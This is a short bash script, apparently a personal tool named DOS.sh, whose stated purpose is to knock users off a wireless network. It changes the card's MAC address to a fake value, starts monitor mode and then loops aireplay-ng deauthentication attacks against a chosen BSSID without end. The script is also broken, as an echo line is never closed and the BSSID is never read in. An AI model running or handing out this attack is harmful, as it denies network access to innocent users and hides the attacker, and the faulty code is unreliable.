#!/bin/bash
#***********************************************
#Name:  DOS.sh
#Purpose: Knock off and prevent users from accessing a wireless network
#Author:  Matthew Sage
#Date Written:  25/05/10
#***********************************************
clear
echo " You have chosen 'DOS Attack' "
echo " press [ctrl + c] to exit "
echo ""

airmon-ng stop wlan0
ifconfig wlan0 down
macchanger --mac 00:11:22:33:44:55 wlan0
airmon-ng start wlan0

airodump-ng wlan0

echo "Please enter network BSSID
$bssid

count=1
pass=0

while [ $count -gt $pass ]; do
	aireplay-ng -0 5 -a $bssid wlan0
done




